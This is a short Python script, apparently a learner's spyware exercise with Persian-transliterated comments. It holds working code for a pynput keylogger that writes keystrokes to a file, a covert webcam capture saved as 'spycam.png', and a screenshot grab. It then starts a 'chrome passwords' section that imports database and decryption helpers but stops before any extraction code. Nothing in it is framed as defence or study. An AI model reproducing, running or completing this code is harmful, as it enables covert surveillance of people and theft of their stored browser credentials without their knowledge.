# ?key loger
from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta

special_keys = {"Key.space": "[space]", "Key.enter": "[enter]"}


def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("kl.txt", "a") as f:
        f.write(listen)


start = datetime.now()
end = start + timedelta(seconds=5)


def on_release(key):
    if datetime.now() >= end:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# -----------------------webcam-------------------------
import cv2

camera = cv2.VideoCapture(0)
# shakhes dastgah = 0

ret, frame = camera.read()
# 2 ta chiz return mikone yeki true or false = ret , yeki frame
if ret:
    cv2.imwrite("spycam.png", frame)

camera.release()
cv2.destroyAllWindows()
# -----------------------screenshot-------------------------
import pyautogui
my_screenshot = pyautogui.screenshot()
my_screenshot.save("my_screenshot.png")
# -----------------------chrome passwords-------------------------
import os
import json
import base64
# encrypt and decrypt
import sqlite3
# work with db
import shutil
# copy file ...
# import win32crypt
# pypiwin32



